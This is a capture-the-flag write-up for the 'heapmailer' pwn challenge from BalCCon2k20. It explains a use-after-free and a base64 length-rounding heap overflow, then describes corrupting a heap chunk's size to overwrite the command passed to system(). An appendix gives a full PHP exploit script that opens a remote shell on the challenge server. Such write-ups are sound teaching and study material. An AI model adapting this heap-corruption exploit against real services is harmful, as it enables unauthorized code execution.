# heapmailer - BalCCon2k20 CTF (pwn, 497p, 1 solved)
## Introduction

heapmailer is a pwn task.

An archive containing a Linux binary and a libc is provided.

The binary is a C++ binary emulating an SMTP server.

## Reverse engineering

The binary uses a custom linked list structure :
```c
struct list {
	struct list *next;
	size_t size;
	char   data[0];
};
```

It uses this structure to store mostly strings. The size is `0x10 + size`. It
can also store other kind of data, such as pointers.

There are 2 linked lists recipients and data chunk.

The server handles 5 different commands :
- `HELP` prints the help
- `FROM` changes the user's identity
- `RCPT` push a new structure on the recipient list
- `RCRM` removes a structure from the recipient list
- `CHNK` decodes a base64 string and pushes its content to the chunk list
- `POPC` removes the last entry from the chunk list
- `SEND` calls `system(command)`, with `command` being loaded at start

The `FROM` command has a use-after-free vulnerability : when the user first sets
its identity, and then changes it without specifying a name, the program will
free its current identity without clearing the pointer.
```cpp
cout << "New identity: ";
inputSize = readInput(input);

/* Free current identity */
if(user->next != nullptr)
	delElt(user->next);

/* Executed only if there is a name ! */
if(input[0] != 0) {
	struct list *list;

	/* Create a new element that contains the user's input */
	list = newElt(inputSize);
	copyString(input, input + inputSize, &list->data);

	user->next = list;
}
```

The `CHNK` command does not handle properly base64 without padding.
```cpp
struct list *list;

cout << "Base64-encoded data: ";
inputSize = readInput(input);

list = newElt(((inputSize - 1) / 4) * 3);
/* [...] */
chunks = list;
b64decode(input, &list->data);
```

The problem is that the division operator returns the quotient of the Euclidean
division. For example : in `inputSize` contains 99 A and a new line, the result
of the operation will be :
```
x = (100 - 1) / 4 * 3
x = 99 / 4 * 3
x = 24 * 3
x = 96 == 0x60
```

Decoding this payload will overwrite 2 bytes of the next chunk.

The `SEND` command calls `system` on a string that gets read from a file.
The content of this file is stored on the heap.


## Exploitation

It is obvious that the expected solution here is to overwrite the command buffer
and hijack the call to `system` with a different payload.

The heap layout looks something like this :
```
0x000000: tcache (0x250)
0x000250: ? big (0x11c10)
0x011e60: command pointer (0x20)
0x011e80: ? 0x230
0x0120b0: ? 0x20
0x0120d0: std::cout buffer (0x410)
0x0124e0: free (0x1be0)
0x0140c0: free (was: command buffer) (0x30)
0x0140f0: command content (0x40)
```

The idea is to split the free buffer at `0x124e0` in two. By using the base64
vulnerability, it is possible to overwrite the next chunk's size to a size
larger than its actual size.

This oversized free chunk can then be used to create a new chunk that will spray
`/bin/sh\0` all over the command buffer.

The only requirement is to create a fake chunk before corrupting the size to
fool glibc's security checks :

```
0x0124e0: free
...
0x0140F0: command
...
0x016000: 0x0000000000001C70 0x0000000000000020
0x016010: 0x0000000000001C70 0x0000000000000020
0x016020: 0x0000000000001C70 0x0000000000000020
0x016030: 0x0000000000001C70 0x0000000000000020
0x016040: 0x0000000000001C70 0x0000000000000020
0x016050: 0x0000000000001C70 0x0000000000000020
0x016060: 0x0000000000001C70 0x0000000000000020
0x016070: 0x0000000000001C70 0x0000000000000020
...
```

`0x20` is the smallest size a chunk can have. Its `PREV_INUSE` bit is not set.
`0x1C70` is the `prev_size` which has to match the corrupted chunk's size.

Once the command has been overwritten, a simple use of the `SEND` command
launches the payload.

Now, an attentive reader might ask :
> But what about that use-after-free explained before ?

which is a very good question.


**Flag**: `BCTF{sorry_that_mail_is_not_gonna_arrive}`

## Appendices
### pwn.php

```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const HOST = "pwn.institute";
const PORT = 13201;
const SIZE = 0x1C70;

function chnk(Tube $t, $data)
{
	$t->expect("Anonymous ~> ");
	$t->write("CHNK\n");

	$t->expect("Base64-encoded data: ");
	$t->write("$data\n");
}

printf("[*] Creating process\n");
$time = microtime(true);

$t = new Socket(HOST, PORT);

$t->expectLine("------------------------------------------------------------");
$t->expectLine("| H.E.A.P. Mailer v1 - Highly Efficient Arbitrary Protocol |");
$t->expectLine("------------------------------------------------------------");
$t->expectLine("");
$t->expectLine("  Enter HELP to display a list of commands.");
$t->expectLine("");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");


printf("[+] Spray next chunk\n");
$payload = str_repeat(pack("Q*", SIZE, 0x20), 0x800); 
$payload = base64_encode($payload);
chnk($t, $payload);

printf("[+] Corrupt size\n");
$payload = str_repeat("\x00", 0x48) . pack("v", SIZE | 1);
$payload = rtrim(base64_encode($payload), "=");
chnk($t, $payload);

printf("[+] Overwrite stuff\n");
$payload = str_pad("/bin/sh", 8, "\x00");
$payload = str_repeat($payload, (SIZE - 0x10 - 0x08) / 8);
$payload = rtrim(base64_encode($payload), "=");
chnk($t, $payload);


/* Get shell */
$t->expect("Anonymous ~> ");
$t->write("SEND\n");

printf("[!] shell\n");
$t->pipe();
```